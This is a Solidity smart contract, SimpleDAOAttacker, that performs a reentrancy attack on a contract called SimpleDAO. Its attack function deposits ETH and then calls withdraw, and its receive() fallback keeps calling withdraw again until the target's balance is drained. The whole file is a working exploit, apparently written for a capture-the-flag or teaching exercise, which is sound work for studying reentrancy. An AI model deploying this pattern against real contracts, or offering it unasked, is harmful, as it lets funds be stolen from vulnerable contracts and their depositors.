// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

interface ISimpleDAO {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function credit(address) external view returns (uint256);
}

/// @notice Reentrancy attacker for SimpleDAO.
/// Deposits 1 ETH, then drains via reentrancy in withdraw().
contract SimpleDAOAttacker {
    ISimpleDAO public target;
    uint256 public attackAmount;
    bool public attacking;

    constructor(address _target) {
        target = ISimpleDAO(_target);
    }

    /// Kick off attack: deposit then immediately withdraw.
    function attack(uint256 amount) external payable {
        require(msg.value >= amount, "need ETH");
        attackAmount = amount;
        target.deposit{value: amount}();
        attacking = true;
        target.withdraw(amount);
        attacking = false;
    }

    /// Fallback — called by SimpleDAO during withdraw's .call{}
    receive() external payable {
        if (attacking && address(target).balance >= attackAmount) {
            target.withdraw(attackAmount);
        }
    }

    function balance() external view returns (uint256) {
        return address(this).balance;
    }
}
